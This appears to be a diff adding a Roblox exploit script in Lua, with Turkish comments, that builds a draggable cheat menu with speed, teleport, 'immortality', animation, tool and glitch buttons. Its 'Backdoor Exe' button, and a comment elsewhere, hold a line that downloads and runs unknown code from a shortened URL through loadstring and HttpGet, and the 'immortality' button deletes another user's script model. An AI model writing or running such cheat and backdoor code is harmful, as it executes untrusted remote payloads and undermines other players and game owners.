@@ -1,0 +1,165 @@
+local gui = Instance.new("ScreenGui")
+gui.Name = "@Youtube: FR00KV1"
+gui.Parent = game.CoreGui
+
+-- Sürüklenebilir Frame
+local fr = Instance.new("Frame")
+fr.Size = UDim2.new(0.8, 0, 0.5, 0)
+fr.Position = UDim2.new(0.1, 0, 0.3, 0)
+fr.BackgroundColor3 = Color3.new(255, 215, 0)
+fr.BorderColor3 = Color3.new(0, 0, 0)
+fr.BorderSizePixel = 1
+fr.Active = true
+fr.BackgroundTransparency = 0
+fr.Draggable = true
+fr.Parent = gui
+
+-- Speed Butonu
+local speedButton = Instance.new("TextButton")
+speedButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+speedButton.Position = UDim2.new(0.1, 0, 0.0, 0)
+speedButton.BackgroundColor3 = Color3.new(0, 0, 0)
+speedButton.Text = "Speed"
+speedButton.TextColor3 = Color3.new(255, 215, 0)
+speedButton.Font = Enum.Font.Code
+speedButton.TextSize = 17
+speedButton.Parent = fr
+speedButton.MouseButton1Down:Connect(function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
+end)
+
+-- Kafe To Olma Butonu
+local cafeButton = Instance.new("TextButton")
+cafeButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+cafeButton.Position = UDim2.new(0.4, 0, 0.0, 0)
+cafeButton.BackgroundColor3 = Color3.new(0, 0, 0)
+cafeButton.Text = "Kafe To Olma"
+cafeButton.TextColor3 = Color3.new(255, 215, 0)
+cafeButton.Font = Enum.Font.Code
+cafeButton.TextSize = 17
+cafeButton.Parent = fr
+cafeButton.MouseButton1Down:Connect(function()
+    local player = game.Players.LocalPlayer
+    player.Character:SetPrimaryPartCFrame(CFrame.new(2932.30, 108.76, 329.96))
+end)
+
+-- Ölümsüzlük Butonu
+local immortalityButton = Instance.new("TextButton")
+immortalityButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+immortalityButton.Position = UDim2.new(0.1, 0, 0.2, 0)
+immortalityButton.BackgroundColor3 = Color3.new(0, 0, 0)
+immortalityButton.Text = "Ölümsüzlük"
+immortalityButton.TextColor3 = Color3.new(255, 215, 0)
+immortalityButton.Font = Enum.Font.Code
+immortalityButton.TextSize = 17
+immortalityButton.Parent = fr
+immortalityButton.MouseButton1Down:Connect(function()
+    -- 'workspace.Mahmutben89.Scriptler' modelini siler
+    local scriptModel = workspace:FindFirstChild("Mahmutben89") and workspace.Mahmutben89:FindFirstChild("Scriptler")
+    if scriptModel then
+        scriptModel:Destroy()
+    end
+    -- GUI kullanıcısının ismini modeldeki isme yerleştirir
+    local playerName = game.Players.LocalPlayer.Name
+    -- Burada istediğiniz bir script çalıştırabilirsiniz
+    -- Örneğin: loadstring(game:HttpGet("https://tinyurl.com/msfhyx4r"))()
+end)
+
+-- Özel Karakter V5 Butonu
+local specialCharacterButton = Instance.new("TextButton")
+specialCharacterButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+specialCharacterButton.Position = UDim2.new(0.1, 0, 0.4, 0)
+specialCharacterButton.BackgroundColor3 = Color3.new(0, 0, 0)
+specialCharacterButton.Text = "Özel Karakter V5"
+specialCharacterButton.TextColor3 = Color3.new(255, 215, 0)
+specialCharacterButton.Font = Enum.Font.Code
+specialCharacterButton.TextSize = 17
+specialCharacterButton.Parent = fr
+specialCharacterButton.MouseButton1Down:Connect(function()
+    local character = game.Players.LocalPlayer.Character
+    if character then
+        -- Tüm animasyonları sil
+        for _, anim in pairs(character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks()) do
+            anim:Stop()
+        end
+        -- Belirtilen animasyonu çalıştır
+        local walkAnim = Instance.new("Animation")
+        walkAnim.AnimationId = "rbxassetid://11416062386"
+        local walkTrack = character.Humanoid:LoadAnimation(walkAnim)
+        walkTrack:Play()
+
+        -- Zıplama animasyon ID'si
+        local jumpAnim = Instance.new("Animation")
+        jumpAnim.AnimationId = "rbxassetid://235542946"
+        local jumpTrack = character.Humanoid:LoadAnimation(jumpAnim)
+        -- Zıplama durumuna göre animasyon durumu
+        character.Humanoid.Jumping:Connect(function()
+            jumpTrack:Play()
+        end)
+    end
+end)
+
+-- Tool Değişiklik Butonu
+local toolChangeButton = Instance.new("TextButton")
+toolChangeButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+toolChangeButton.Position = UDim2.new(0.4, 0, 0.2, 0)
+toolChangeButton.BackgroundColor3 = Color3.new(0, 0, 0)
+toolChangeButton.Text = "Tool Değişiklik"
+toolChangeButton.TextColor3 = Color3.new(255, 215, 0)
+toolChangeButton.Font = Enum.Font.Code
+toolChangeButton.TextSize = 17
+toolChangeButton.Parent = fr
+toolChangeButton.MouseButton1Down:Connect(function()
+    -- Envanterdeki tüm araçları alma ve kafa üzerinden yerleştirme
+    for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            tool.Parent = game.Players.LocalPlayer.Character
+        end
+    end
+    -- Elde araç olmasın ve kafa üzerinden tool girsin
+    local head = game.Players.LocalPlayer.Character:WaitForChild("Head")
+    for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            tool.Parent = head
+        end
+    end
+end)
+
+-- Backdoor Exe Butonu
+local backdoorButton = Instance.new("TextButton")
+backdoorButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+backdoorButton.Position = UDim2.new(0.4, 0, 0.4, 0)
+backdoorButton.BackgroundColor3 = Color3.new(0, 0, 0)
+backdoorButton.Text = "Backdoor Exe"
+backdoorButton.TextColor3 = Color3.new(255, 215, 0)
+backdoorButton.Font = Enum.Font.Code
+backdoorButton.TextSize = 17
+backdoorButton.Parent = fr
+backdoorButton.MouseButton1Down:Connect(function()
+    loadstring(game:HttpGet("https://tinyurl.com/msfhyx4r"))()
+end)
+
+-- Glitch Butonu
+local glitchButton = Instance.new("TextButton")
+glitchButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+glitchButton.Position = UDim2.new(0.7, 0, 0.0, 0)
+glitchButton.BackgroundColor3 = Color3.new(0, 0, 0)
+glitchButton.Text = "GLİCH"
+glitchButton.TextColor3 = Color3.new(255, 215, 0)
+glitchButton.Font = Enum.Font.Code
+glitchButton.TextSize = 17
+glitchButton.Parent = fr
+glitchButton.MouseButton1Down:Connect(function()
+    -- Parçalara ayırma efekti
+    local character = game.Players.LocalPlayer.Character
+    if character then
+        for _, part in pairs(character:GetChildren()) do
+            if part:IsA("BasePart") then
+                local newPart = part:Clone()
+                newPart.Parent = workspace
+                newPart.CFrame = part.CFrame + Vector3.new(math.random(-10, 10), math.random(-10, 10), math.random(-10, 10))
+                part:Destroy()
+            end
+        end
+    end
+end)
